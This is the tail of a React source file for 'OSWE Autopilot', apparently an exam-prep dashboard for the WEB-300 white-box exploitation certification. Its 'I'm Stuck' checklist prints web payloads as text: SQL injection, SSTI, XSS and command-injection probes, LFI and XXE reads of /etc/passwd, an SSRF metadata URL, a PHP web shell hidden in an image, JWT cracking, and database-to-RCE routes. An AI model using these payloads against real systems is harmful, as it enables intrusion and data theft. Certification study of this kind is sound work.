.phase-title{font-size:13px;font-weight:700;color:var(--t0)}
.phase-desc{font-size:11px;color:var(--t2)}
.steps-wrap{border-top:1px solid var(--bd)}
.step{border-bottom:1px solid var(--bd)}.step:last-child{border-bottom:none}
.step-row{padding:8px 14px;display:flex;align-items:flex-start;gap:8px;cursor:pointer;transition:background .1s}
.step-row:hover{background:var(--b3)}
.snum{width:20px;height:20px;border-radius:50%;background:var(--b0);border:1px solid var(--bd);display:flex;align-items:center;justify-content:center;font-size:9px;font-weight:700;color:var(--t2);flex-shrink:0;margin-top:1px;transition:all .15s}
.snum.crit{border-color:var(--ac);color:var(--ac);background:var(--acd)}
.snum.done{border-color:var(--g);color:#fff;background:var(--g)}
.s-act{font-size:12px;font-weight:600;color:var(--t0)}.s-chk{font-size:10px;color:var(--t2);margin-top:1px}
.s-exp{background:var(--b0);margin:0 10px 10px 42px;border-radius:5px;border:1px solid var(--bd);padding:8px 10px}
.cmd{font-family:var(--m);font-size:11px;color:var(--cg);white-space:pre-wrap;word-break:break-all;line-height:1.65}
.cp{background:var(--b3);border:1px solid var(--bd);border-radius:3px;padding:2px 8px;font-size:9px;color:var(--t2);cursor:pointer;font-family:var(--m);flex-shrink:0;transition:all .15s}
.cp:hover{border-color:var(--ac);color:var(--ac)}.cp.ok{border-color:var(--g);color:var(--g)}
.arrow{font-size:9px;color:var(--t2);transition:transform .2s;flex-shrink:0}.arrow.open{transform:rotate(90deg)}
.sec-title{font-size:12px;font-weight:700;color:var(--ac);text-transform:uppercase;letter-spacing:1px;margin:16px 0 10px}
.chk-item{display:flex;align-items:center;gap:8px;padding:5px 8px;border-radius:4px;cursor:pointer;font-size:11.5px;transition:background .1s}
.chk-item:hover{background:var(--b3)}.chk-item.done{color:var(--g);opacity:.6;text-decoration:line-through}
.chk-box{width:15px;height:15px;border-radius:3px;border:1.5px solid var(--bd);display:flex;align-items:center;justify-content:center;flex-shrink:0;font-size:9px;transition:all .15s}
.chk-box.on{background:var(--ac);border-color:var(--ac);color:#fff}
.prog{height:3px;background:var(--b3);border-radius:2px;margin-bottom:14px;overflow:hidden}
.prog-fill{height:100%;border-radius:2px;transition:width .3s}
.notes{width:100%;min-height:500px;background:var(--b0);border:1px solid var(--bd);border-radius:6px;padding:14px;color:var(--t0);font-family:var(--m);font-size:11.5px;line-height:1.8;resize:vertical;outline:none}
.notes:focus{border-color:var(--ac)}
.timer-bar{background:var(--b2);border:1px solid var(--bd);border-radius:8px;padding:14px;margin-bottom:14px}
.timer-display{font-family:var(--m);font-size:28px;font-weight:700;color:var(--t0);text-align:center;margin-bottom:8px}
.timer-btns{display:flex;gap:6px;justify-content:center;margin-bottom:10px}
.timer-btn{padding:5px 14px;font-size:11px;font-weight:600;border-radius:4px;border:1px solid var(--bd);background:var(--b3);color:var(--t1);cursor:pointer;font-family:var(--s);transition:all .15s}
.timer-btn:hover{border-color:var(--ac);color:var(--ac)}
.timer-btn.active{background:var(--ac);border-color:var(--ac);color:#fff}
.milestone{display:flex;gap:10px;align-items:flex-start;padding:6px 0;font-size:11px}
.mile-h{font-family:var(--m);font-weight:700;color:var(--ac);min-width:40px;flex-shrink:0}
.mile-t{color:var(--t1)}.mile-now{color:var(--g);font-weight:600}
.qref-card{background:var(--b2);border:1px solid var(--bd);border-radius:6px;padding:8px 12px;display:flex;justify-content:space-between;align-items:center;cursor:pointer;transition:all .15s;margin-bottom:4px}
.qref-card:hover{border-color:var(--ac);background:var(--b3)}
.score-bar{display:flex;gap:4px;margin-bottom:14px;flex-wrap:wrap}
.score-seg{flex:1;padding:6px 8px;border-radius:4px;font-size:10px;font-weight:600;text-align:center;cursor:default;min-width:120px}
.decision-box{background:var(--b2);border:1px solid var(--bd);border-radius:8px;padding:16px;margin-bottom:14px}
.decision-box h3{color:var(--ac);font-size:14px;margin-bottom:12px}
.decision-btn{display:block;width:100%;padding:10px 14px;margin-bottom:6px;background:var(--b0);border:1px solid var(--bd);border-radius:6px;color:var(--t0);font-family:var(--s);font-size:12px;font-weight:600;cursor:pointer;text-align:left;transition:all .15s}
.decision-btn:hover{border-color:var(--ac);background:var(--acd)}
.decision-btn.active{border-color:var(--ac);background:var(--acd);color:var(--ac)}
.enc-in{width:100%;min-height:80px;background:var(--b0);border:1px solid var(--bd);border-radius:6px;padding:10px;color:var(--t0);font-family:var(--m);font-size:11px;line-height:1.6;resize:vertical;outline:none;margin-bottom:14px}
.enc-in:focus{border-color:var(--ac)}
.enc-out{background:var(--b2);border:1px solid var(--bd);border-radius:6px;padding:10px 14px;margin-bottom:8px}
.enc-label{font-size:10px;font-weight:700;color:var(--ac);text-transform:uppercase;letter-spacing:1px;margin-bottom:4px}
.enc-val{font-family:var(--m);font-size:11px;color:var(--cg);word-break:break-all;white-space:pre-wrap;line-height:1.5}
.stuck-card{background:var(--b2);border:1px solid var(--bd);border-radius:8px;padding:12px 14px;margin-bottom:8px}
.stuck-q{font-size:13px;font-weight:700;color:var(--t0);margin-bottom:4px}
.stuck-tip{font-size:11px;color:var(--t2);margin-bottom:6px}
`;

// ━━━ COMPONENTS ━━━
function CopyBtn({text}){
  const[c,setC]=useState(false);
  return <button className={`cp ${c?'ok':''}`} onClick={e=>{e.stopPropagation();navigator.clipboard.writeText(text);setC(true);setTimeout(()=>setC(false),1200)}}>{c?'✓':'Copy'}</button>
}

function PhaseList({phases,vals}){
  const[openP,setOpenP]=useState({0:true});
  const[openS,setOpenS]=useState({});
  const[doneS,setDoneS]=useState({});
  return(<div>{phases.map((phase,pi)=>{
    const isO=openP[pi]!==false;
    const allDone=phase.steps.every((_,si)=>doneS[`${pi}-${si}`]);
    return(<div className="phase" key={pi}>
      <div className="phase-h" onClick={()=>setOpenP(p=>({...p,[pi]:!p[pi]}))}>
        <div className={`phase-num ${allDone?'done':''}`}>{allDone?'✓':pi+1}</div>
        <div style={{flex:1}}><div className="phase-title">{phase.phase}</div><div className="phase-desc">{phase.desc}</div></div>
        <span className={`arrow ${isO?'open':''}`}>▶</span>
      </div>
      {isO&&<div className="steps-wrap">{phase.steps.map((step,si)=>{
        const k=`${pi}-${si}`;const isExp=openS[k];const isDone=doneS[k];
        const cmdText=step.cmd(vals);
        return(<div className="step" key={si}>
          <div className="step-row" onClick={()=>setOpenS(p=>({...p,[k]:!p[k]}))}>
            <div className={`snum ${isDone?'done':step.critical?'crit':''}`} onClick={e=>{e.stopPropagation();setDoneS(p=>({...p,[k]:!p[k]}))}}>{isDone?'✓':si+1}</div>
            <div style={{flex:1}}><div className="s-act">{step.action}</div><div className="s-chk">→ {step.check}</div></div>
            <CopyBtn text={cmdText}/>
          </div>
          {isExp&&<div className="s-exp"><div className="cmd">{cmdText}</div></div>}
        </div>)
      })}</div>}
    </div>)
  })}</div>)
}

// ━━━ TABS ━━━
function DecisionTab({vals}){
  const[mode,setMode]=useState(null);
  const chains={recon:RECON_CHAIN,auth:AUTH_CHAIN,rce:RCE_CHAIN,extra:EXTRA_CHAIN,script:SCRIPT_CHAIN};
  const labels={recon:"🔍 Phase 0: Recon & Code Review",auth:"🔓 Phase 1: Authentication Bypass",rce:"⚡ Phase 2: Remote Code Execution",extra:"🛡️ Phase 3: Path Traversal / Race / Crypto",script:"🐍 Phase 4: Python Exploit Script"};
  return(<div>
    <div className="score-bar">
      <div className="score-seg" style={{background:'var(--acd)',color:'var(--ac)'}}>2 Machines (50pts each)</div>
      <div className="score-seg" style={{background:'var(--gd)',color:'var(--g)'}}>Auth Bypass → RCE Chain</div>
      <div className="score-seg" style={{background:'rgba(234,179,8,.1)',color:'var(--y)'}}>47h45m exam + 24h report</div>
    </div>
    <div className="decision-box">
      <h3>🔍 What phase are you in?</h3>
      <p style={{fontSize:11,color:'var(--t2)',marginBottom:12}}>OSWE tests code review + exploit chaining. Select your current phase.</p>
      {Object.entries(labels).map(([k,v])=>(
        <button key={k} className={`decision-btn ${mode===k?'active':''}`} onClick={()=>setMode(k)}>{v}</button>
      ))}
    </div>
    {mode&&<PhaseList phases={chains[mode]} vals={vals}/>}
  </div>)
}

function QuickRefTab(){
  const[openS,setOpenS]=useState({});
  return(<div>{Object.entries(QUICK_REF).map(([cat,cmds])=>(
    <div key={cat}><div className="sec-title">{cat}</div>
    {cmds.map((c,i)=>{const k=`${cat}-${i}`;return(<div key={i}>
      <div className="qref-card" onClick={()=>setOpenS(p=>({...p,[k]:!p[k]}))}>
        <span style={{fontSize:11,fontWeight:600,color:'var(--t0)'}}>{c.l}</span><CopyBtn text={c.c}/>
      </div>
      {openS[k]&&<div className="s-exp" style={{margin:'0 0 8px 0'}}><div className="cmd">{c.c}</div></div>}
    </div>)})}</div>
  ))}</div>)
}

function ChecklistTab(){
  const[checked,setChecked]=useState({});
  const total=Object.values(CHECKLIST).flat().length;
  const done=Object.values(checked).filter(Boolean).length;
  const pct=total>0?Math.round(done/total*100):0;
  return(<div>
    <div style={{fontSize:11,color:'var(--t2)',marginBottom:6}}>{done}/{total} completed ({pct}%)</div>
    <div className="prog"><div className="prog-fill" style={{width:`${pct}%`,background:pct>=100?'var(--g)':pct>=70?'var(--y)':'var(--ac)'}}/></div>
    {Object.entries(CHECKLIST).map(([section,items])=>(
      <div key={section}><div className="sec-title">{section}</div>
      {items.map((item,i)=>{const k=`${section}-${i}`;const on=checked[k];return(
        <div key={i} className={`chk-item ${on?'done':''}`} onClick={()=>setChecked(p=>({...p,[k]:!p[k]}))}>
          <div className={`chk-box ${on?'on':''}`}>{on?'✓':''}</div><span>{item}</span>
        </div>)})}</div>
    ))}
  </div>)
}

function TimerTab(){
  const[running,setRunning]=useState(false);
  const[elapsed,setElapsed]=useState(0);
  const ref=useRef(null);
  const start=()=>{if(!running){setRunning(true);ref.current=setInterval(()=>setElapsed(e=>e+1),1000)}};
  const pause=()=>{setRunning(false);clearInterval(ref.current)};
  const reset=()=>{setRunning(false);clearInterval(ref.current);setElapsed(0)};
  useEffect(()=>()=>clearInterval(ref.current),[]);
  const hrs=Math.floor(elapsed/3600),mins=Math.floor((elapsed%3600)/60),secs=elapsed%60;
  const display=`${String(hrs).padStart(2,'0')}:${String(mins).padStart(2,'0')}:${String(secs).padStart(2,'0')}`;
  const totalSec=47*3600+45*60,remaining=Math.max(0,totalSec-elapsed);
  const rH=Math.floor(remaining/3600),rM=Math.floor((remaining%3600)/60),rS=remaining%60;
  const remD=`${String(rH).padStart(2,'0')}:${String(rM).padStart(2,'0')}:${String(rS).padStart(2,'0')}`;
  const eH=elapsed/3600;
  return(<div>
    <div className="timer-bar">
      <div style={{fontSize:10,color:'var(--t2)',textAlign:'center',marginBottom:4}}>EXAM TIME (47h 45min)</div>
      <div className="timer-display">{display}</div>
      <div style={{fontSize:12,color:remaining<=3600?'var(--r)':'var(--t2)',textAlign:'center',marginBottom:8}}>Remaining: {remD}</div>
      <div className="prog"><div className="prog-fill" style={{width:`${Math.min(100,elapsed/totalSec*100)}%`,background:remaining<=3600?'var(--r)':remaining<=14400?'var(--y)':'var(--ac)'}}/></div>
      <div className="timer-btns">
        <button className={`timer-btn ${running?'active':''}`} onClick={start}>▶ Start</button>
        <button className="timer-btn" onClick={pause}>⏸ Pause</button>
        <button className="timer-btn" onClick={reset}>↺ Reset</button>
      </div>
    </div>
    <div className="sec-title">Milestones</div>
    {MILESTONES.map((m,i)=>{
      const next=i<MILESTONES.length-1?MILESTONES[i+1]:null;
      const isCur=eH>=m.hour&&(!next||eH<next.hour);
      const passed=eH>=m.hour;
      return(<div className="milestone" key={i}>
        <div className="mile-h">{m.hour}h</div>
        <div className={`mile-t ${isCur?'mile-now':''}`} style={{opacity:passed&&!isCur?.5:1}}>{isCur?'👉 ':''}{m.label}</div>
      </div>)
    })}
  </div>)
}

// ━━━ TAB: I'M STUCK ━━━
function StuckTab(){
  const checks=[
    { q: "Did you map ALL application routes?", cmd: "# Check routing files:\nfind . -name 'routes*' -o -name 'urls.py' -o -name 'web.php' -o -name 'app.js'\n# Check for hidden API endpoints in JS files:\ngrep -rn 'api\\|endpoint\\|fetch\\|axios' . --include='*.js' | grep -v node_modules", tip: "OSWE apps often have hidden admin endpoints or API routes not linked in the UI. Check ALL routing definitions.", critical: true },
    { q: "Did you READ the source code carefully?", cmd: "# Check for dangerous patterns:\ngrep -rnE '(eval|exec|system|unserialize|pickle|readObject)' . --include='*.php' --include='*.java' --include='*.py' --include='*.js' --include='*.cs'\n# Check for SQL concatenation:\ngrep -rn 'SELECT.*+\\|INSERT.*+\\|UPDATE.*+' . --include='*.php' --include='*.java'", tip: "Don't just grep — READ the code flow from HTTP request to database query. Trace the data path manually.", critical: true },
    { q: "Did you test ALL input fields for injection?", cmd: "# SQLi: ' OR 1=1--\n# SSTI: {{7*7}}\n# XSS: <script>alert(1)</script>\n# CMDi: ;id\n# LFI: ../../etc/passwd\n# Deserialization: Check cookies, hidden fields, headers", tip: "Test EVERY parameter: URL params, POST body, cookies, headers, JSON fields, file uploads.", critical: true },
    { q: "Did you check authentication bypass vectors?", cmd: "# Type juggling: 0 == 'string' in PHP\n# Magic hashes: MD5('240610708') starts with 0e\n# Mass assignment: add role=admin to POST\n# IDOR: change user ID in URL\n# JWT: try alg=none, weak secret\nhashcat -m 16500 jwt.txt rockyou.txt", tip: "Auth bypass is 50% of the exam. Check: type juggling, JWT flaws, IDOR, default creds, SQL injection in login.", critical: true },
    { q: "Did you check for deserialization vulnerabilities?", cmd: "# PHP: grep 'unserialize' . -rn\n# Java: grep 'readObject\\|ObjectInputStream' . -rn\n# .NET: grep 'BinaryFormatter\\|__VIEWSTATE' . -rn\n# Python: grep 'pickle.loads\\|yaml.load' . -rn\n# Node: grep 'serialize\\|unserialize' . -rn", tip: "Deserialization is a common OSWE RCE vector. Check cookies, session data, and any base64-encoded parameters." },
    { q: "Did you check the database type and permissions?", cmd: "# PostgreSQL: COPY TO PROGRAM (superuser = RCE)\n# MySQL: INTO OUTFILE (FILE priv = webshell)\n# MSSQL: xp_cmdshell (sa = RCE)\n# SQLite: limited but can write files\n\n# Check DB config:\ngrep -ri 'password\\|dbname\\|host\\|port' config/ .env web.config", tip: "If you have SQLi, the DB type determines your RCE path. PostgreSQL superuser is the easiest to RCE.", critical: true },
    { q: "Did you look for file upload bypass?", cmd: "# Extensions: .php5, .phtml, .phar, .pHp\n# Double ext: shell.php.jpg\n# Content-Type: change to image/jpeg\n# Magic bytes: GIF89a<?php system($_GET['c']); ?>\n# .htaccess upload: AddType application/x-httpd-php .jpg", tip: "If there's a file upload, try EVERY bypass technique. Check what validation the code actually does." },
    { q: "Did you try SSRF / XXE?", cmd: "# XXE: <?xml version='1.0'?><!DOCTYPE d [<!ENTITY x SYSTEM 'file:///etc/passwd'>]><d>&x;</d>\n# SSRF: http://127.0.0.1:8080, http://169.254.169.254/\n# Check any XML parsing, URL fetching, or webhook features", tip: "Any feature that processes XML or fetches URLs could be vulnerable." },
    { q: "Did you check for race conditions?", cmd: "# Use Burp Turbo Intruder with race.py template\n# Or Python threading:\nimport threading\nthreads = [threading.Thread(target=exploit) for _ in range(20)]\nfor t in threads: t.start()", tip: "Coupon redemption, file upload validation, and balance transfers are classic race condition targets." },
    { q: "Is your Python exploit script complete?", cmd: "# OSWE requires a SINGLE script:\n# python3 exploit.py <TARGET> <LHOST> <LPORT>\n# Must be NON-INTERACTIVE\n# Must chain: Auth Bypass → RCE\n# Test on clean machine before submitting!", tip: "Start writing the script EARLY. Don't wait until you've fully exploited manually — build it as you go.", critical: true },
  ];
  return(<div>
    <div className="score-bar"><div className="score-seg" style={{background:'rgba(239,68,68,.08)',color:'var(--r)',flex:2}}>⚠️ RULE: If stuck {'>'} 1 hour on one vector, try a different approach.</div></div>
    <p style={{fontSize:11,color:'var(--t2)',marginBottom:14}}>Go through each question. If you answer "no" to ANY, do it before trying anything else.</p>
    {checks.map((c,i)=><div className="stuck-card" key={i}>
      <div style={{display:'flex',alignItems:'flex-start',gap:10,marginBottom:6}}>
        <div className={`phase-num`} style={{width:24,height:24,fontSize:10,flexShrink:0,background:c.critical?'var(--acd)':'var(--b0)',borderColor:c.critical?'var(--ac)':'var(--bd)',color:c.critical?'var(--ac)':'var(--t2)'}}>{i+1}</div>
        <div style={{flex:1}}>
          <div className="stuck-q">{c.q}</div>
          <div className="stuck-tip">{c.tip}</div>
        </div>
        <CopyBtn text={c.cmd}/>
      </div>
      <div className="cmd" style={{background:'var(--b0)',padding:8,borderRadius:4,fontSize:10,marginLeft:34}}>{c.cmd}</div>
    </div>)}
  </div>)
}

// ━━━ TAB: ENCODING ━━━
function EncodingTab(){
  const[input,setInput]=useState("");
  const encodings=[
    { label: "Base64", fn: s=>{ try{return btoa(unescape(encodeURIComponent(s)))}catch(e){return "[error]"} } },
    { label: "Base64 Decode", fn: s=>{ try{return decodeURIComponent(escape(atob(s)))}catch(e){return "[invalid base64]"} } },
    { label: "URL Encode", fn: s=>encodeURIComponent(s) },
    { label: "Double URL Encode", fn: s=>encodeURIComponent(encodeURIComponent(s)) },
    { label: "HTML Entities", fn: s=>s.split('').map(c=>c.charCodeAt(0)>127||'<>&"\''.includes(c)?`&#${c.charCodeAt(0)};`:c).join('') },
    { label: "Hex (\\x)", fn: s=>s.split('').map(c=>'\\x'+c.charCodeAt(0).toString(16).padStart(2,'0')).join('') },
    { label: "Unicode (\\u)", fn: s=>s.split('').map(c=>'\\u'+c.charCodeAt(0).toString(16).padStart(4,'0')).join('') },
    { label: "Hex (0x, comma)", fn: s=>s.split('').map(c=>'0x'+c.charCodeAt(0).toString(16).padStart(2,'0')).join(', ') },
  ];
  return(<div>
    <div className="sec-title">Input</div>
    <textarea className="enc-in" value={input} onChange={e=>setInput(e.target.value)} placeholder="Type or paste payload here..." spellCheck={false}/>
    <div className="sec-title">Encoded Output</div>
    {input&&encodings.map((enc,i)=>{
      const result=enc.fn(input);
      return(<div className="enc-out" key={i}>
        <div style={{display:'flex',justifyContent:'space-between',alignItems:'center',marginBottom:4}}>
          <div className="enc-label">{enc.label}</div>
          <CopyBtn text={result}/>
        </div>
        <div className="enc-val">{result}</div>
      </div>)
    })}
    {!input&&<p style={{fontSize:11,color:'var(--t2)'}}>Enter text above to see all encodings.</p>}
  </div>)
}

function NotesTab(){
  const[notes,setNotes]=useState(()=>localStorage.getItem('oswe-notes-v2')||`# OSWE Exam Notes\n\n## Machine 1\nLanguage: \nDatabase: \nRouting: \nAuth Bypass: \nRCE Method: \nExploit Script: \nproof.txt (auth): \nproof.txt (rce): \n\n## Machine 2\nLanguage: \nDatabase: \nRouting: \nAuth Bypass: \nRCE Method: \nExploit Script: \nproof.txt (auth): \nproof.txt (rce): \n\n## Credentials Found\n\n## Key Code Snippets\n`);
  useEffect(()=>{localStorage.setItem('oswe-notes-v2',notes)},[notes]);
  return(<div>
    <p style={{fontSize:10,color:'var(--t2)',marginBottom:8}}>Notes saved to browser automatically.</p>
    <textarea className="notes" value={notes} onChange={e=>setNotes(e.target.value)} spellCheck={false}/>
  </div>)
}

// ━━━ MAIN APP ━━━
const TABS=["🎯 Decision Engine","🔎 Grep-Fu","🆘 I'm Stuck","🔀 Encoding","✅ Checklist","⏱ Timer","📝 Notes"];

function App(){
  const[tab,setTab]=useState(0);
  const[target,setTarget]=useState("");
  const[proxy,setProxy]=useState("");
  const[lhost,setLhost]=useState("");
  const vals={target,proxy,lhost};

  return(<>
    <style>{CSS}</style>
    <div className="app">
      <div className="hdr">
        <div><div className="logo">OSWE Autopilot</div><div className="logo-sub">WEB-300 • White Box Exploitation</div></div>
        <div className="inps">
          <input className="inp" placeholder="Target URL" value={target} onChange={e=>setTarget(e.target.value)} style={{width:180}}/>
          <input className="inp" placeholder="Proxy (127.0.0.1:8080)" value={proxy} onChange={e=>setProxy(e.target.value)} style={{width:160}}/>
          <input className="inp" placeholder="LHOST" value={lhost} onChange={e=>setLhost(e.target.value)} style={{width:110}}/>
        </div>
      </div>
      <div className="tabs">{TABS.map((t,i)=><button key={i} className={`tab ${tab===i?'on':''}`} onClick={()=>setTab(i)}>{t}</button>)}</div>
      <div className="main">
        {tab===0&&<DecisionTab vals={vals}/>}
        {tab===1&&<QuickRefTab/>}
        {tab===2&&<StuckTab/>}
        {tab===3&&<EncodingTab/>}
        {tab===4&&<ChecklistTab/>}
        {tab===5&&<TimerTab/>}
        {tab===6&&<NotesTab/>}
      </div>
    </div>
  </>)
}

ReactDOM.createRoot(document.getElementById('root')).render(<App/>);
